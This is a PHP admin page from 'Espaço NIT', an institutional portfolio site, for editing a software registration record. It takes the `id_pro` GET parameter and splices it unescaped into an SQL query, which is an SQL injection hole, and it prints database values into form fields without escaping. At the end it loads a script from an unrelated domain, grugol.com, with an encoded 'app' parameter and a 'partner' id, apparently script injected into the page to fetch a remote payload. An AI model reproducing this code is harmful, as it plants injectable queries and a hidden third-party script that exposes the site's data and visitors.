<?php

include 'configs/conexao.php';

if (!isset($_SESSION)) {
  session_start();
}
$id_pro = $_GET["id_pro"];
$sql = "SELECT * FROM programa_computador WHERE cd_pro = $id_pro";
$res = $conn->query($sql);
$dados = $res->fetch_object();

?>

<html lang="pt-BR">

<head>

  <meta charset="UTF-8" />
  <title>Administrador - Editar Usuário</title>
  <meta charset="UTF-8">

  <!--Os arquivos Meta-->
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <meta name="description" content"Espaço NIT">
  <meta name="author" content="">
  <!--Fim dos arquivos Meta-->

  <!--Os Arquivos CSS-->
  <link href="css/bootstrap.min.css" rel="stylesheet">
  <link href="css/bootstrap-responsive.min.css" rel="stylesheet">
  <link href="css/template.css" rel="stylesheet">


  <!--HTML5 shim,for IE6-8 support of HTML5 elements -->
  <!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

</head>

<body>

  <!-- Modal -->
  <div class="modal fade" id="edition-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
          <h4 class="modal-title" id="modalLabel">Cancelar edição</h4>
        </div>
        <div class="modal-body">
          Deseja realmente cancelar essa edição?
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary">Sim</button>
          <button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
        </div>
      </div>
    </div>
  </div>

  <nav class="navbar navbar-default navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <span class="navbar-brand" href="index.php"><b>Espaço NIT</b></span>
      </div>
      <div id="navbar" class="navbar-collapse collapse">
        <ul class="nav navbar-nav">
          <li><a href="tela_principal.php">Portfólio</a></li>
          <li><a href="quem.php">Quem Somos</a></li>
          <li><a href="contato.php">Contato</a></li>
          <li><a href="https://www.facebook.com/NIT.IFAL">Fan Page</a></li>
          <li><a href="https://www.instagram.com/NIT.IFAL">Instagram</a></li>
        </ul>
        <ul class="nav navbar-nav navbar-right">




        </ul>
      </div><!--/.nav-collapse -->
    </div>
  </nav> <!--Final da NavBar-->


  <div class="container-fluid" style="margin-top:80px;">
    <div class="row">
      <div class="col-md-2" id="menu-esquerdo">
        <p><img src="img/nit.jpg" style="margin-left:15px"></p>
        <ul class="nav nav-pills nav-stacked">
          <li role="presentation"><a href="propriedades.php"><img src="img/dashboard.png"> DashBoard</a></li>
          <li role="presentation"><a href="minhastarefas.php"><img src="img/carrinho.png"> Minhas Tarefas</a></li>
          <li role="presentation"><a href="minhaconta.php"><img src="img/ticket.png"> Minha Conta</a></li>
          <li role="presentation"><a href="faq.php"><img src="img/faq.png"> Sistema de FAQ</a></li>
          <li role="presentation"><a href="login.php"><img src="img/sair.png"> Sair</a></li>
        </ul>
      </div> <!--Final Menu Esquerdo-->
      <div class="col-md-10">
        <form class="form-horizontal" action="configs/programa_editar.php" method="post">
          <input type="hidden" name="id" value="<?php print $dados->cd_pro; ?>">
          <fieldset>


            <legend style="text-align:center;">Preencha os campos abaixo para editar o Software</legend>


            <div class="form-group">
              <label class="col-md-4 control-label" for="titulo">Título do Software</label>
              <div class="col-md-4">
                <input id="textinput" name="titulo" type="text" value="<?php print $dados->titulo; ?>" required="true" class="form-control input-md">
                <span class="help-block">Título do Programa de Computador</span>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="ling">Linguagem do Software</label>
              <div class="col-md-4">
                <input id="textinput" name="ling" type="text" value="<?php print $dados->ling; ?>" required="true" class="form-control input-md">
                <span class="help-block">Linguagem utilizada no software</span>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="tipo">Tipo de Software</label>
              <div class="col-md-4">
                <input id="textinput" name="tipo" type="text" value="<?php print $dados->tipo_pro; ?>" required="true" class="form-control input-md">
                <span class="help-block">Tipo do software</span>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="campo">Campo de aplicação do Software</label>
              <div class="col-md-4">
                <input id="textinput" name="campo" type="text" value="<?php print $dados->campo; ?>" required="true" class="form-control input-md">
                <span class="help-block">Campo de aplicação do software</span>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="status">Status do Software</label>
              <div class="col-md-4">
                <select id="selectbasic" name="status" required="true" required="true" class="form-control">
                  <option value="1" <?php echo $dados->status == '1' ? 'selected' : '' ?>>Software Concedido</option>
                  <option value="2" <?php echo $dados->status == '2' ? 'selected' : '' ?>>Software Depositado</option>
                  <option value="3" <?php echo $dados->status == '3' ? 'selected' : '' ?>>Acompanhamento Revista</option>
                  <option value="4" <?php echo $dados->status == '4' ? 'selected' : '' ?>>Esperando Contabilidade</option>
                  <option value="5" <?php echo $dados->status == '5' ? 'selected' : '' ?>>Em Desenvolvimento</option>

                </select>
                <span class="help-block">Selecione o Status do Software</span>
              </div>
            </div>


            <div class="form-group">
              <label class="col-md-4 control-label" for="num_autores">Quantidade de Autores</label>
              <div class="col-md-4">
                <select id="selectbasic" name="num_autores" required="true" class="form-control">
                  <option value="1" <?php echo $dados->qtd_aut == '1' ? 'selected' : '' ?>>01</option>
                  <option value="2" <?php echo $dados->qtd_aut == '2' ? 'selected' : '' ?>>02</option>
                  <option value="3" <?php echo $dados->qtd_aut == '3' ? 'selected' : '' ?>>03</option>
                  <option value="4" <?php echo $dados->qtd_aut == '4' ? 'selected' : '' ?>>04</option>
                  <option value="5" <?php echo $dados->qtd_aut == '5' ? 'selected' : '' ?>>05</option>
                  <option value="6" <?php echo $dados->qtd_aut == '6' ? 'selected' : '' ?>>06</option>
                  <option value="7" <?php echo $dados->qtd_aut == '7' ? 'selected' : '' ?>>07</option>
                  <option value="8" <?php echo $dados->qtd_aut == '8' ? 'selected' : '' ?>>08</option>
                  <option value="9" <?php echo $dados->qtd_aut == '9' ? 'selected' : '' ?>>09</option>
                  <option value="10" <?php echo $dados->qtd_aut == '10' ? 'selected' : '' ?>>10</option>
                  <option value="11" <?php echo $dados->qtd_aut == '11' ? 'selected' : '' ?>>11</option>
                  <option value="12" <?php echo $dados->qtd_aut == '12' ? 'selected' : '' ?>>12</option>
                  <option value="13" <?php echo $dados->qtd_aut == '13' ? 'selected' : '' ?>>13</option>
                  <option value="14" <?php echo $dados->qtd_aut == '14' ? 'selected' : '' ?>>14</option>
                  <option value="15" <?php echo $dados->qtd_aut == '15' ? 'selected' : '' ?>>15</option>

                </select>
                <span class="help-block">Selecione a quantidade de autores</span>
              </div>
            </div>



            <div class="form-group">
              <label class="col-md-4 control-label" for="singlebutton"></label>
              <div class="col-md-4">
                <button id="singlebutton" name="singlebutton" class="btn btn-default">limpar</button>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="button1id"></label>
              <div class="col-md-8">
                <button id="button1id" type="submit" name="button1id" class="btn btn-success">próximo</button>
                <button id="" name="" class="btn btn-inverse">cancelar</button>
              </div>
            </div>


          </fieldset>
        </form>
      </div>

    </div>

    <hr>

    <div class="row">
      <div class="col-md-12">
        <footer>
          <h3>&copy Espaço NIT - Todos os Direitos Reservados</h3>
        </footer>
      </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

    <!-- Latest compiled and minified JavaScript -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
    <script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script>
</body>
</body>

</html>

</html>